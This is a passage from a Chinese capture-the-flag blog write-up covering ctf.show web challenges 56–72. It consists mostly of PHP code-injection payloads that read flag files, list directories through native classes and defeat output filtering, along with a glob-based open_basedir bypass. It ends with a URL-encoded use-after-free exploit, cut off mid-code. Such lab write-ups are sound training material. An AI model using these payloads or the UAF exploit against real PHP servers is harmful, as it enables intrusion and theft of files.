html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>POST数据包POC<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://e76b0b60-1e1a-4cc2-b39e-e3548d1a6fcc.challenge.ctf.show/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;post&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-comment">&lt;!--链接是当前打开的题目链接--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span>文件名：<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;提交&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>利用一个简单的文本</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">#!/bin/sh<br>cat flag.php<br></code></pre></td></tr></table></figure><p>得到flag</p><h2 id="web57"><a class="markdownIt-Anchor" href="#web57"></a> web57</h2><p>利用linux语言的特性构造36</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))<br></code></pre></td></tr></table></figure><h2 id="web58"><a class="markdownIt-Anchor" href="#web58"></a> web58</h2><h3 id="0x01-11"><a class="markdownIt-Anchor" href="#0x01-11"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=readfile(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x02-11"><a class="markdownIt-Anchor" href="#0x02-11"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x03"><a class="markdownIt-Anchor" href="#0x03"></a> 0x03</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x04"><a class="markdownIt-Anchor" href="#0x04"></a> 0x04</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=copy(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;flag.txt&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x05"><a class="markdownIt-Anchor" href="#0x05"></a> 0x05</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x06"><a class="markdownIt-Anchor" href="#0x06"></a> 0x06</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=<span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-string">&quot;flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x07"><a class="markdownIt-Anchor" href="#0x07"></a> 0x07</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=print_r(file(<span class="hljs-string">&quot;flag.php&quot;</span>));     <br></code></pre></td></tr></table></figure><h2 id="web59"><a class="markdownIt-Anchor" href="#web59"></a> web59</h2><p>基本同上可以找到</p><h2 id="web60"><a class="markdownIt-Anchor" href="#web60"></a> web60</h2><p>检测一下直接上，题目一样的，过滤了几个函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=copy(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;flag.txt&quot;</span>);<br>c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web61"><a class="markdownIt-Anchor" href="#web61"></a> web61</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web62"><a class="markdownIt-Anchor" href="#web62"></a> web62</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web63"><a class="markdownIt-Anchor" href="#web63"></a> web63</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web64"><a class="markdownIt-Anchor" href="#web64"></a> web64</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web65"><a class="markdownIt-Anchor" href="#web65"></a> web65</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=show_source(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=highlight_file(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>c=include(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=flag.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web66"><a class="markdownIt-Anchor" href="#web66"></a> web66</h2><h3 id="0x01-12"><a class="markdownIt-Anchor" href="#0x01-12"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=print_r(scandir(<span class="hljs-string">&quot;/&quot;</span>))<br>c=highlight_file(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x02-12"><a class="markdownIt-Anchor" href="#0x02-12"></a> 0x02</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;;<br><br><br>c=%<span class="hljs-number">24</span>dir%<span class="hljs-number">3</span>Dnew%<span class="hljs-number">20</span><span class="hljs-built_in">DirectoryIterator</span>(%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>F%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aforeach(%<span class="hljs-number">24</span>dir%<span class="hljs-number">20</span><span class="hljs-keyword">as</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>f)%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span><span class="hljs-keyword">echo</span>(%<span class="hljs-number">24</span>f.<span class="hljs-string">&#x27;%3Cbr%3E&#x27;</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">3</span>B;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$exp</span>;<br><br><br>c=%<span class="hljs-number">24</span>exp%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">20</span><span class="hljs-keyword">new</span>%<span class="hljs-number">20</span><span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;%2Fflag.txt&#x27;</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aecho%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>exp%<span class="hljs-number">3</span>B;<br></code></pre></td></tr></table></figure><p>一个奇巧的思路，利用php的原生类进行的读取都需要进行url编码</p><h2 id="web67"><a class="markdownIt-Anchor" href="#web67"></a> web67</h2><h3 id="0x01-13"><a class="markdownIt-Anchor" href="#0x01-13"></a> 0x01</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-variable">$dir</span>=<span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;/&quot;</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dir</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>.<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;;<br><br><br>c=%<span class="hljs-number">24</span>dir%<span class="hljs-number">3</span>Dnew%<span class="hljs-number">20</span><span class="hljs-built_in">DirectoryIterator</span>(%<span class="hljs-number">22</span>%<span class="hljs-number">2</span>F%<span class="hljs-number">22</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aforeach(%<span class="hljs-number">24</span>dir%<span class="hljs-number">20</span><span class="hljs-keyword">as</span>%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>f)%<span class="hljs-number">7</span>B%<span class="hljs-number">0</span>A%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span>%<span class="hljs-number">20</span><span class="hljs-keyword">echo</span>(%<span class="hljs-number">24</span>f.<span class="hljs-string">&#x27;%3Cbr%3E&#x27;</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D%<span class="hljs-number">3</span>B;<br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$exp</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$exp</span>;<br><br><br>c=%<span class="hljs-number">24</span>exp%<span class="hljs-number">20</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">20</span><span class="hljs-keyword">new</span>%<span class="hljs-number">20</span><span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;%2Fflag.txt&#x27;</span>)%<span class="hljs-number">3</span>B%<span class="hljs-number">0</span>Aecho%<span class="hljs-number">20</span>%<span class="hljs-number">24</span>exp%<span class="hljs-number">3</span>B;<br></code></pre></td></tr></table></figure><h3 id="0x02-13"><a class="markdownIt-Anchor" href="#0x02-13"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=print_r(scandir(<span class="hljs-string">&quot;/&quot;</span>))<br>c=highlight_file(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web68"><a class="markdownIt-Anchor" href="#web68"></a> web68</h2><p>😋发现我这种解法好像官p还没有也是直接上原生</p><p>先进行<code>c=var_dump(scandir('/'));</code>或者用上面的原生类</p><h3 id="0x01-14"><a class="markdownIt-Anchor" href="#0x01-14"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=%24exp%20%3D%20new%20SplFileObject(<span class="hljs-string">&#x27;%2Fflag.txt&#x27;</span>)%3B%0Aecho%20%24exp%3B;<br></code></pre></td></tr></table></figure><h3 id="0x02-14"><a class="markdownIt-Anchor" href="#0x02-14"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x03-2"><a class="markdownIt-Anchor" href="#0x03-2"></a> 0x03</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=readgzfile(<span class="hljs-string">&quot;/flag.txt&quot;</span>);<br></code></pre></td></tr></table></figure><p>readgzfile函数在 PHP 中用于读取一个 GZIP 压缩的文件并直接输出其内容。</p><h2 id="web69"><a class="markdownIt-Anchor" href="#web69"></a> web69</h2><p>新的思路扫描目录</p><p><code>c=echo%20implode(&quot;,&quot;,(scandir('/')));</code></p><p>这段代码利用了 <code>scandir('/')</code> 函数来列出根目录的内容，然后用 <code>implode(&quot;,&quot;, ...)</code> 将数组连接为一个字符串，再通过 <code>echo</code> 输出。</p><h3 id="0x01-15"><a class="markdownIt-Anchor" href="#0x01-15"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h3 id="0x02-15"><a class="markdownIt-Anchor" href="#0x02-15"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=readgzfile(<span class="hljs-string">&quot;/flag.txt&quot;</span>);<br></code></pre></td></tr></table></figure><p>readgzfile函数在 PHP 中用于读取一个 GZIP 压缩的文件并直接输出其内容。</p><p>原生类用不来了，可能过长了</p><h2 id="web70"><a class="markdownIt-Anchor" href="#web70"></a> web70</h2><p>同69基本没变化</p><h2 id="web71"><a class="markdownIt-Anchor" href="#web71"></a> web71</h2><p>看一下源码关键内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">ob_get_contents</span>();<br>      <span class="hljs-title function_ invoke__">ob_end_clean</span>();<br>      <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-variable">$s</span>);<br></code></pre></td></tr></table></figure><p>简单的来说就是缓冲区清理，防止直接暴露信息</p><h3 id="0x01-16"><a class="markdownIt-Anchor" href="#0x01-16"></a> 0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=include(<span class="hljs-string">&#x27;/flag.txt&#x27;</span>);<span class="hljs-built_in">exit</span>();<br></code></pre></td></tr></table></figure><p>exit进行截断</p><h3 id="0x02-16"><a class="markdownIt-Anchor" href="#0x02-16"></a> 0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=readgzfile(<span class="hljs-string">&quot;/flag.txt&quot;</span>);<span class="hljs-built_in">exit</span>();<br></code></pre></td></tr></table></figure><p>当然也可以进行提前送出</p><h3 id="0x03-3"><a class="markdownIt-Anchor" href="#0x03-3"></a> 0x03</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=readgzfile(<span class="hljs-string">&quot;/flag.txt&quot;</span>);ob_flush();<br></code></pre></td></tr></table></figure><h2 id="web72"><a class="markdownIt-Anchor" href="#web72"></a> web72</h2><p>看源码也没什么思路，去看了下官p，思路还是要发散一下，这里也是利用了原生类进行读取找到flag所在的文件在哪里</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=?&gt;&lt;?php     <span class="hljs-variable">$a</span>=new DirectoryIterator(<span class="hljs-string">&quot;glob:///*&quot;</span>);foreach(<span class="hljs-variable">$a</span> as <span class="hljs-variable">$f</span>)&#123;<span class="hljs-built_in">echo</span>(<span class="hljs-variable">$f</span>-&gt;__toString().<span class="hljs-string">&#x27; &#x27;</span>);&#125;<span class="hljs-built_in">exit</span>(0);?&gt;<br></code></pre></td></tr></table></figure><p>讲一下大致的原理，首先利用?&gt;提前截取，然后利用原生类进行遍历读取文件，<code>glob:///*</code> 是一个流包装器（Stream Wrapper），它使用 <code>glob</code> 函数的模式来匹配根目录下的所有文件和文件夹。然后遍历读取，exit也是利用了提前截断。找到了flag在flag0.txt</p><p>利用了PHP中的一个<strong>Use-After-Free (UAF)漏洞</strong>来绕过<code>open_basedir</code>限制，从而执行任意命令（如读取<code>/flag0.txt</code>）。UAF漏洞利用了PHP的内存管理特性，尤其是对象在内存中的布局和其析构方式来操纵内存，从而获得代码执行能力，虽然看不懂但是用还是可以的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c=<span class="hljs-keyword">function</span>%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B<span class="hljs-string">&#x27;args&#x27;</span>%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%0A%